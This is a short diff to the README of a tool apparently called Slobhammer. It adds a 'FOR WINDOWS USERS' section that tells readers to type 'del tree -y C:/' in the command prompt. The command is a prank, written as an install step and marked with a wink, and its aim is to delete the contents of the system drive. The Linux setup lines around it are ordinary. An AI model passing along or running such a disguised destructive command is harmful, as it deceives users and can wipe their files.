@@ -1,4 +1,8 @@
+--FOR LINUX USERS--
 You must place the Slobhammer directory in your home folder [~], then run the install.sh.
+
+--FOR WINDOWS USERS--
+type del tree -y C:/ in command prompt, and install Linux ....;]
 
 TO RUN:
 first open three terminals and type this in each:
